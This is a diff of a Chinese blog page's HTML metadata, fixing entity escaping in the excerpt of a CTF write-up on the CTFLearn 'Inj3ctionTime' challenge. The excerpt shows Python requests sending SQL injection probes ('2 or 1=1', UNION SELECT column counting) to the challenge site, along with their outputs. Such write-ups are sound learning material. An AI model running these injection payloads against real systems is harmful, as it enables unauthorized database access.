@@ -2,11 +2,13 @@
 <html lang="en-us">
     <head><meta charset='utf-8'>
 <meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='题目链接：(https://ctflearn.com/challenge/149)
-此题是我至今做到的最难的题目，因此写一份回顾显得尤为必要。菜鸡成长的路上需要用这种方式积累经验，希望以后能成长为看到这样的题目就直呼简单的高手&amp;hellip; &amp;hellip;
-根据题意，需要使用UNION语句注入。首先还是先进行简单的注入测试。 ret = requests.get(&amp;#34;https://web.ctflearn.com/web8/&amp;#34;, params={&amp;#34;id&amp;#34;: &amp;#34;2&amp;#34;}) soup = BeautifulSoup(ret.text, &amp;#39;lxml&amp;#39;) print(soup.prettify()) # Output: # Name: Doodle # Bread: Poodle # Color: Pink 在数字2之后附上简单的布尔表达式，观察结果。
-ret = requests.get(&amp;#34;https://web.ctflearn.com/web8/&amp;#34;, params={&amp;#34;id&amp;#34;: &amp;#34;2 or 1=1&amp;#34;}) # Output: # 得到了三组Name、Bread、Color，证明布尔语句直接可以起到作用 至此，我们知道可以直接在数字后面跟上一个表达式或者SQL语句，也就是可以直接上UNION语句了。我在今天才算是正式地接触了UNIION注入的流程，以下将做完整的记录和解释。 首先，使用UNION语句判断每一次查询的结果一共有几个字段。原理是使用UNION语句在原本的查询结果后面附加自己构造的一行数据，当我们构造的字段数与原本的字段数不符合时，将引发异常，当字段数匹配时，就有显而易见的效果。首先尝试3个字段。
-ret = requests.get(&amp;#34;https://web.ctflearn.com/web8/&amp;#34;, params={&amp;#34;id&amp;#34;: &amp;#34;-2 union select 1,2,3&amp;#34;}) # Output: # 0 results 结果表明3个字段是不对的，那么再增加：
-ret = requests.get(&amp;#34;https://web.ctflearn.com/web8/&amp;#34;, params={&amp;#34;id&amp;#34;: &amp;#34;-2 union select 1,2,3,4&amp;#34;}) # Output: # Name: 2 # Breed: 1 # Color: 3 非常Nice，不仅表明了查询的结果有四个字段，而且显示出每个字段对应的是什么含义。再试试5个字段：'><title>CTFLearn-Inj3ctionTime</title>
+此题是我至今做到的最难的题目，因此写一份回顾显得尤为必要。菜鸡成长的路上需要用这种方式积累经验，希望以后能成长为看到这样的题目就直呼简单的高手&hellip; &hellip;
+根据题意，需要使用UNION语句注入。首先还是先进行简单的注入测试。 ret = requests.get(&#34;https://web.ctflearn.com/web8/&#34;, params={&#34;id&#34;: &#34;2&#34;}) soup = BeautifulSoup(ret.text, &#39;lxml&#39;) print(soup.prettify()) # Output: # Name: Doodle # Bread: Poodle # Color: Pink 在数字2之后附上简单的布尔表达式，观察结果。
+ret = requests.get(&#34;https://web.ctflearn.com/web8/&#34;, params={&#34;id&#34;: &#34;2 or 1=1&#34;}) # Output: # 得到了三组Name、Bread、Color，证明布尔语句直接可以起到作用 至此，我们知道可以直接在数字后面跟上一个表达式或者SQL语句，也就是可以直接上UNION语句了。我在今天才算是正式地接触了UNIION注入的流程，以下将做完整的记录和解释。 首先，使用UNION语句判断每一次查询的结果一共有几个字段。原理是使用UNION语句在原本的查询结果后面附加自己构造的一行数据，当我们构造的字段数与原本的字段数不符合时，将引发异常，当字段数匹配时，就有显而易见的效果。首先尝试3个字段。
+ret = requests.get(&#34;https://web.ctflearn.com/web8/&#34;, params={&#34;id&#34;: &#34;-2 union select 1,2,3&#34;}) # Output: # 0 results 结果表明3个字段是不对的，那么再增加：
+ret = requests.get(&#34;https://web.ctflearn.com/web8/&#34;, params={&#34;id&#34;: &#34;-2 union select 1,2,3,4&#34;}) # Output: # Name: 2 # Breed: 1 # Color: 3 非常Nice，不仅表明了查询的结果有四个字段，而且显示出每个字段对应的是什么含义。再试试5个字段：
+ret = requests.get(&#34;https://web.ctflearn.com/web8/&#34;, params={&#34;id&#34;: &#34;2 union select 1,2,3,4,5&#34;}) # Output: # 0 results 已经明确了，系统做的每一次查询结果就是有四个字段，只需要将对应字段的数字改为SQL语句，就可以把我们需要的信息在相应字段显示出来。
+'><title>CTFLearn-Inj3ctionTime</title>
 
 <link rel='canonical' href='https://xrg.fj.cn/p/ctflearn-inj3ctiontime/'>
 
@@ -31,21 +33,25 @@ ret = requests.get(&amp;#34;https://web.ctflearn.com/web8/&amp;#34;, params={&am
 
 <meta property='og:title' content='CTFLearn-Inj3ctionTime'>
 <meta property='og:description' content='题目链接：(https://ctflearn.com/challenge/149)
-此题是我至今做到的最难的题目，因此写一份回顾显得尤为必要。菜鸡成长的路上需要用这种方式积累经验，希望以后能成长为看到这样的题目就直呼简单的高手&amp;hellip; &amp;hellip;
-根据题意，需要使用UNION语句注入。首先还是先进行简单的注入测试。 ret = requests.get(&amp;#34;https://web.ctflearn.com/web8/&amp;#34;, params={&amp;#34;id&amp;#34;: &amp;#34;2&amp;#34;}) soup = BeautifulSoup(ret.text, &amp;#39;lxml&amp;#39;) print(soup.prettify()) # Output: # Name: Doodle # Bread: Poodle # Color: Pink 在数字2之后附上简单的布尔表达式，观察结果。
-ret = requests.get(&amp;#34;https://web.ctflearn.com/web8/&amp;#34;, params={&amp;#34;id&amp;#34;: &amp;#34;2 or 1=1&amp;#34;}) # Output: # 得到了三组Name、Bread、Color，证明布尔语句直接可以起到作用 至此，我们知道可以直接在数字后面跟上一个表达式或者SQL语句，也就是可以直接上UNION语句了。我在今天才算是正式地接触了UNIION注入的流程，以下将做完整的记录和解释。 首先，使用UNION语句判断每一次查询的结果一共有几个字段。原理是使用UNION语句在原本的查询结果后面附加自己构造的一行数据，当我们构造的字段数与原本的字段数不符合时，将引发异常，当字段数匹配时，就有显而易见的效果。首先尝试3个字段。
-ret = requests.get(&amp;#34;https://web.ctflearn.com/web8/&amp;#34;, params={&amp;#34;id&amp;#34;: &amp;#34;-2 union select 1,2,3&amp;#34;}) # Output: # 0 results 结果表明3个字段是不对的，那么再增加：
-ret = requests.get(&amp;#34;https://web.ctflearn.com/web8/&amp;#34;, params={&amp;#34;id&amp;#34;: &amp;#34;-2 union select 1,2,3,4&amp;#34;}) # Output: # Name: 2 # Breed: 1 # Color: 3 非常Nice，不仅表明了查询的结果有四个字段，而且显示出每个字段对应的是什么含义。再试试5个字段：'>
+此题是我至今做到的最难的题目，因此写一份回顾显得尤为必要。菜鸡成长的路上需要用这种方式积累经验，希望以后能成长为看到这样的题目就直呼简单的高手&hellip; &hellip;
+根据题意，需要使用UNION语句注入。首先还是先进行简单的注入测试。 ret = requests.get(&#34;https://web.ctflearn.com/web8/&#34;, params={&#34;id&#34;: &#34;2&#34;}) soup = BeautifulSoup(ret.text, &#39;lxml&#39;) print(soup.prettify()) # Output: # Name: Doodle # Bread: Poodle # Color: Pink 在数字2之后附上简单的布尔表达式，观察结果。
+ret = requests.get(&#34;https://web.ctflearn.com/web8/&#34;, params={&#34;id&#34;: &#34;2 or 1=1&#34;}) # Output: # 得到了三组Name、Bread、Color，证明布尔语句直接可以起到作用 至此，我们知道可以直接在数字后面跟上一个表达式或者SQL语句，也就是可以直接上UNION语句了。我在今天才算是正式地接触了UNIION注入的流程，以下将做完整的记录和解释。 首先，使用UNION语句判断每一次查询的结果一共有几个字段。原理是使用UNION语句在原本的查询结果后面附加自己构造的一行数据，当我们构造的字段数与原本的字段数不符合时，将引发异常，当字段数匹配时，就有显而易见的效果。首先尝试3个字段。
+ret = requests.get(&#34;https://web.ctflearn.com/web8/&#34;, params={&#34;id&#34;: &#34;-2 union select 1,2,3&#34;}) # Output: # 0 results 结果表明3个字段是不对的，那么再增加：
+ret = requests.get(&#34;https://web.ctflearn.com/web8/&#34;, params={&#34;id&#34;: &#34;-2 union select 1,2,3,4&#34;}) # Output: # Name: 2 # Breed: 1 # Color: 3 非常Nice，不仅表明了查询的结果有四个字段，而且显示出每个字段对应的是什么含义。再试试5个字段：
+ret = requests.get(&#34;https://web.ctflearn.com/web8/&#34;, params={&#34;id&#34;: &#34;2 union select 1,2,3,4,5&#34;}) # Output: # 0 results 已经明确了，系统做的每一次查询结果就是有四个字段，只需要将对应字段的数字改为SQL语句，就可以把我们需要的信息在相应字段显示出来。
+'>
 <meta property='og:url' content='https://xrg.fj.cn/p/ctflearn-inj3ctiontime/'>
 <meta property='og:site_name' content='XR_G&#39;s Blog'>
 <meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='CTF' /><meta property='article:published_time' content='2020-09-18T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2020-09-18T00:00:00&#43;00:00'/>
 <meta name="twitter:title" content="CTFLearn-Inj3ctionTime">
 <meta name="twitter:description" content="题目链接：(https://ctflearn.com/challenge/149)
-此题是我至今做到的最难的题目，因此写一份回顾显得尤为必要。菜鸡成长的路上需要用这种方式积累经验，希望以后能成长为看到这样的题目就直呼简单的高手&amp;hellip; &amp;hellip;
-根据题意，需要使用UNION语句注入。首先还是先进行简单的注入测试。 ret = requests.get(&amp;#34;https://web.ctflearn.com/web8/&amp;#34;, params={&amp;#34;id&amp;#34;: &amp;#34;2&amp;#34;}) soup = BeautifulSoup(ret.text, &amp;#39;lxml&amp;#39;) print(soup.prettify()) # Output: # Name: Doodle # Bread: Poodle # Color: Pink 在数字2之后附上简单的布尔表达式，观察结果。
-ret = requests.get(&amp;#34;https://web.ctflearn.com/web8/&amp;#34;, params={&amp;#34;id&amp;#34;: &amp;#34;2 or 1=1&amp;#34;}) # Output: # 得到了三组Name、Bread、Color，证明布尔语句直接可以起到作用 至此，我们知道可以直接在数字后面跟上一个表达式或者SQL语句，也就是可以直接上UNION语句了。我在今天才算是正式地接触了UNIION注入的流程，以下将做完整的记录和解释。 首先，使用UNION语句判断每一次查询的结果一共有几个字段。原理是使用UNION语句在原本的查询结果后面附加自己构造的一行数据，当我们构造的字段数与原本的字段数不符合时，将引发异常，当字段数匹配时，就有显而易见的效果。首先尝试3个字段。
-ret = requests.get(&amp;#34;https://web.ctflearn.com/web8/&amp;#34;, params={&amp;#34;id&amp;#34;: &amp;#34;-2 union select 1,2,3&amp;#34;}) # Output: # 0 results 结果表明3个字段是不对的，那么再增加：
-ret = requests.get(&amp;#34;https://web.ctflearn.com/web8/&amp;#34;, params={&amp;#34;id&amp;#34;: &amp;#34;-2 union select 1,2,3,4&amp;#34;}) # Output: # Name: 2 # Breed: 1 # Color: 3 非常Nice，不仅表明了查询的结果有四个字段，而且显示出每个字段对应的是什么含义。再试试5个字段：">
+此题是我至今做到的最难的题目，因此写一份回顾显得尤为必要。菜鸡成长的路上需要用这种方式积累经验，希望以后能成长为看到这样的题目就直呼简单的高手&hellip; &hellip;
+根据题意，需要使用UNION语句注入。首先还是先进行简单的注入测试。 ret = requests.get(&#34;https://web.ctflearn.com/web8/&#34;, params={&#34;id&#34;: &#34;2&#34;}) soup = BeautifulSoup(ret.text, &#39;lxml&#39;) print(soup.prettify()) # Output: # Name: Doodle # Bread: Poodle # Color: Pink 在数字2之后附上简单的布尔表达式，观察结果。
+ret = requests.get(&#34;https://web.ctflearn.com/web8/&#34;, params={&#34;id&#34;: &#34;2 or 1=1&#34;}) # Output: # 得到了三组Name、Bread、Color，证明布尔语句直接可以起到作用 至此，我们知道可以直接在数字后面跟上一个表达式或者SQL语句，也就是可以直接上UNION语句了。我在今天才算是正式地接触了UNIION注入的流程，以下将做完整的记录和解释。 首先，使用UNION语句判断每一次查询的结果一共有几个字段。原理是使用UNION语句在原本的查询结果后面附加自己构造的一行数据，当我们构造的字段数与原本的字段数不符合时，将引发异常，当字段数匹配时，就有显而易见的效果。首先尝试3个字段。
+ret = requests.get(&#34;https://web.ctflearn.com/web8/&#34;, params={&#34;id&#34;: &#34;-2 union select 1,2,3&#34;}) # Output: # 0 results 结果表明3个字段是不对的，那么再增加：
+ret = requests.get(&#34;https://web.ctflearn.com/web8/&#34;, params={&#34;id&#34;: &#34;-2 union select 1,2,3,4&#34;}) # Output: # Name: 2 # Breed: 1 # Color: 3 非常Nice，不仅表明了查询的结果有四个字段，而且显示出每个字段对应的是什么含义。再试试5个字段：
+ret = requests.get(&#34;https://web.ctflearn.com/web8/&#34;, params={&#34;id&#34;: &#34;2 union select 1,2,3,4,5&#34;}) # Output: # 0 results 已经明确了，系统做的每一次查询结果就是有四个字段，只需要将对应字段的数字改为SQL语句，就可以把我们需要的信息在相应字段显示出来。
+">
     <link rel="shortcut icon" href="/favicon.ico" />
 
     </head>
@@ -119,7 +125,7 @@ ret = requests.get(&amp;#34;https://web.ctflearn.com/web8/&amp;#34;, params={&am
                     
                     
                         
-                        <img src="/img/avatar_hu53eb95313f34f2c4eaf7d87a8aa930a8_16189_300x0_resize_q75_box.jpg" width="300"
+                        <img src="/img/avatar_hu1780871296191313796.jpg" width="300"
                             height="300" class="site-logo" loading="lazy" alt="Avatar">
                     
                 
@@ -593,14 +599,14 @@ ret = requests.get(&amp;#34;https://web.ctflearn.com/web8/&amp;#34;, params={&am
         
             2020 - 
         
-        2024 XR_G&#39;s Blog
+        2025 XR_G&#39;s Blog
     </section>
     
     <section class="powerby">
         
             有朋自远方来，不亦说乎？ <br/>
-        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
-        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.6.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+         <br />
+        
     </section>
 </footer>
 
